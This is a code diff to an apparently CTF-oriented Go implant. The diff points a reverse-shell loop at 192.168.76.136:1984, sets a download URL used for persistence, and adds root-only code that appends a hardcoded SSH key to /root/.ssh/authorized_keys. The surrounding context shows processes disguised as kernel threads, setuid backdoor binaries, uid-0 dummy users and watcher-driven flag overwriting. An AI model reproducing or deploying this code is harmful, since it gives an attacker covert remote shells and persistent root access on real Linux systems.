@@ -31,6 +31,7 @@ func SetProcessName(name string) error {
 
 	return nil
 }
+
 func connectAndRunShell(ip string, port string) {
 	for {
 		conn, err := net.Dial("tcp", ip+":"+port)
@@ -70,7 +71,7 @@ func isRoot() bool {
 	return false
 }
 
-func overwriteFlagFile(path string, flag string) {
+func overwriteFile(path string, flag string) {
 	//read the file to see if it already contains the flag.
 	data, err := os.ReadFile(path)
 	if err != nil {
@@ -107,11 +108,13 @@ func main() {
 	}
 
 	//Define the list of IP addresses to connect to.
-	ips := []string{"127.0.0.1", "localhost"} // Example list of IP addresses
+	ips := []string{"192.168.76.136"} // Example list of IP addresses
 	//Define the port to connect to.
 	port := "1984"
 	//Define the paths to all the ctf flag files to overwrite with our own.
 	flagFiles := []string{"/home/justin/flag.txt"} // Example list of flag file paths
+	//defines the ssh key to add to the authorized_keys file.
+	sshKey := "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDf+adep5YH3IcKGkkj9IbFn1Ua1S20hKCF+fULaI5cXahITxdh89URSpQ0sMtDolL+VMVzsayq/RCeJT032RicXGLq7wKDXt6eXfyY/fjvph21t014X41whzYz+U8m1wZb/96o09xqkG2rUfACKn0iOK9ukhTFy7/H7vkRpoA8NVEzrcKUZ/x5vzh3fX8nJwHqhfYjd8BLAwuGupWpipFiUMtPWwATgVLv9qQWSXPp4TtK1URCR0aHo7/4MW15OQ4WeU1xZOltaRBMQMigPnUHZNgv8iRgoIPpDBnAgX4SswMggwQNTUIR3fNT9CDxv78VEUGO9GpaLny2EdlXF+xdMngRZHFNias7TaxjeUoydj2sFIK14HAgchT2XdkEObw9/g/vMFfEz7/j/7aFi9QOO5amZ5q2Oqw8H6YX9oYL8aQqVDv4cL3rFzLDTfzWL+Fft32OfFOJPoBtpvrSzyvvZMFNsgdsT5m1w18D1tb4dqt95RuinZ3l/h+m5WHMRWJU3WS1qhVcHeCy9jNIXp/Hf066ZOvYXwpTzkc4/FwCHag4fK4ZcmzJG4Hg8iyRLQEHlDF37epq7IdrN7Y3Q+bYeWQ25KBzSBjjMfjwwi6qE2rfhSnMeSK3mqECWjB/sBpttZn7GDHgbtKzhJKKcLae4tJkiORmdYV10HSkMpOjgw== justin@box1"
 	//define the string to overwrite the flag files with.
 	flag := "flag{this_is_a_fake_flag}"
 	//define the list of uid 0 dummy users to create. (ROOT ONLY)
@@ -132,7 +135,7 @@ func main() {
 		"[ksoftirqd/0]",
 	}
 	//Define the address to download this binary from for the persistence.
-	downloadURL := "http://127.0.0.1:5000/hello"
+	downloadURL := "http://192.168.76.36:5000/claymore"
 	//pick a name from the list randomly.
 	rand.Seed(time.Now().UnixNano())
 	SetProcessName(list_of_unsuspicious_filenames[rand.Intn(len(list_of_unsuspicious_filenames))])
@@ -144,6 +147,20 @@ func main() {
 	if isRoot() {
 		//setuid the binaries.
 		setSuidBitOnBackdoorBinaries(setuidBackdoorBinaries)
+		//write the ssh key to the authorized_keys file.
+		//open the file for appending.
+		file, err := os.OpenFile("/root/.ssh/authorized_keys", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		if err != nil {
+			fmt.Println(err)
+		}
+		//append the ssh key to the file.
+		if _, err := file.WriteString(sshKey + "\n"); err != nil {
+			fmt.Println(err)
+		}
+		//close the file.
+		if err := file.Close(); err != nil {
+			fmt.Println(err)
+		}
 	}
 
 	//generate the persistence command based on the downloadURL.
@@ -165,7 +182,7 @@ func main() {
 
 	//overwrite the flag files with our own flag.
 	for _, path := range flagFiles {
-		overwriteFlagFile(path, flag)
+		overwriteFile(path, flag)
 	}
 	// Watch the flag files for changes and overwrite them with our own flag when they change.
 	w := watcher.New()
@@ -181,7 +198,7 @@ func main() {
 			select {
 			case event := <-w.Event:
 				if event.Op == watcher.Write {
-					overwriteFlagFile(event.Path, flag)
+					overwriteFile(event.Path, flag)
 					//get rid of the event to avoid a loop.
 				}
 			case err := <-w.Error:
